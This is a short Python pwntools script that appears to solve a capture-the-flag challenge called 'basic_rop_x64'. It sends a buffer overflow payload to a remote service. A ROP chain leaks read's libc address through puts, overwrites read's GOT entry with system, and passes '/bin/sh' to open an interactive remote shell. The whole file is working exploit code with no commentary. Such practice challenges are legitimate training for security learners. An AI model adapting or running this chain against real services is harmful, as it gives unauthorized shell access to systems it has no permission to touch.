#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/basic_rop_x64")
libc = pwn.ELF("src/libc.so.6")


POP_RDI = 0x0000000000400883
POP_RSI_R15 = 0x0000000000400881

payload = b"A" * 0x48
payload += pwn.p64(POP_RDI)
payload += pwn.p64(e.got["read"])
payload += pwn.p64(e.plt["puts"])
payload += pwn.p64(POP_RDI)
payload += pwn.p64(0x00)
payload += pwn.p64(POP_RSI_R15)
payload += pwn.p64(e.got["read"])
payload += pwn.p64(0x00)
payload += pwn.p64(e.plt["read"])
payload += pwn.p64(POP_RDI)
payload += pwn.p64(e.got["read"] + 0x08)
payload += pwn.p64(e.plt["read"])

r.send(payload)
r.recvn(0x40)
read = pwn.u64(r.recvn(6) + b"\x00" * 0x02)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

pwn.success(hex(lb))

payload = pwn.p64(system)
payload += b"/bin/sh\x00"
r.send(payload)

r.interactive()